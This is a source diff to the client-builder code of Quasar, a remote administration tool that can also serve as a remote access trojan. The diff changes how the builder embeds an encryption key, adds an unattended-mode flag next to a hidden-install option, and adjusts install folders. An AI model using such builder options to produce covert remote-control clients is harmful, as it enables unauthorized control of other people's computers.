@@ -1,7 +1,6 @@
 ﻿using Mono.Cecil;
 using Mono.Cecil.Cil;
 using Quasar.Common.Cryptography;
-using Quasar.Common.Helpers;
 using Quasar.Server.Models;
 using System;
 using System.Security.Cryptography;
@@ -81,13 +80,14 @@ namespace Quasar.Server.Build
 
         private void WriteSettings(AssemblyDefinition asmDef)
         {
-            var key = StringHelper.GetRandomString(32);
-            var aes = new Aes256(key);
-
             var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
             var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // export without private key, very important!
 
+            var key = serverCertificate.Thumbprint;
+            var aes = new Aes256(key);
+
             byte[] signature;
+            // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
             using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
             {
                 var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
@@ -169,6 +169,9 @@ namespace Quasar.Server.Build
                                         case 6: // HideInstallSubdirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                             break;
+                                        case 7: // UnattendedMode
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UnattendedMode));
+                                            break;
                                     }
                                     bools++;
                                 }
@@ -201,19 +204,19 @@ namespace Quasar.Server.Build
         /// <summary>
         /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
         /// </summary>
-        /// <param name="installpath">The integer value of the install path.</param>
+        /// <param name="installPath">The integer value of the install path.</param>
         /// <returns>Returns the signed-byte value of the special folder.</returns>
-        /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
-        private sbyte GetSpecialFolder(int installpath)
+        /// <exception cref="ArgumentException">Thrown if the path to the special folder was invalid.</exception>
+        private sbyte GetSpecialFolder(int installPath)
         {
-            switch (installpath)
+            switch (installPath)
             {
                 case 1:
                     return (sbyte)Environment.SpecialFolder.ApplicationData;
                 case 2:
-                    return (sbyte)Environment.SpecialFolder.ProgramFilesX86;
+                    return (sbyte)Environment.SpecialFolder.ProgramFiles;
                 case 3:
-                    return (sbyte)Environment.SpecialFolder.SystemX86;
+                    return (sbyte)Environment.SpecialFolder.System;
                 default:
                     throw new ArgumentException("InstallPath");
             }
